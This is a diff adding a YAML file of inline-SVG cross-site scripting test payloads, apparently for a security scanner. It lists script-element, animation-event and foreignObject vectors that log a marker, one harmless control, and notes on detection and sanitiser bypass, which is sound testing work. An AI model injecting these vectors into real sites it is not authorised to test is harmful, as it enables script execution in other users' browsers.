@@ -1,0 +1,26 @@
+# Inline SVG, whose content model and namespace differ from the surrounding
+# HTML. The marker is computed or unique, never a literal the request also
+# carries; a reflected proof may raise a dialog, a stored one may not.
+id: xss/svg
+title: Inline SVG execution proofs
+reviewed: "2026-08-31"
+variables: [MARKER]
+safety: >-
+  One observable marker per entry and nothing else. Use the console form for
+  stored delivery.
+entries:
+  - name: svg script element
+    payload: "<svg><script>console.log('{{MARKER}}')</script></svg>"
+    detect: "Runs under SVG parsing rules where the surrounding document is HTML. Blocked by an inline-script policy exactly as the HTML form is."
+
+  - name: animation event
+    payload: "<svg><animate onbegin=console.log('{{MARKER}}') attributeName=x dur=1s></animate></svg>"
+    detect: "An event that fires on its own, so a negative result is not an untriggered handler."
+
+  - name: foreign content
+    payload: "<svg><foreignObject><img src=x onerror=console.log('{{MARKER}}')></foreignObject></svg>"
+    detect: "Reintroduces HTML parsing inside the subtree; survives sanitisers whose element list was written for SVG only."
+
+  - name: sanitiser control
+    payload: "<svg><circle r=1></circle></svg>"
+    detect: "A harmless element. Present in the parsed document means the subtree accepts markup and the entries above failed on their script, not on their markup."
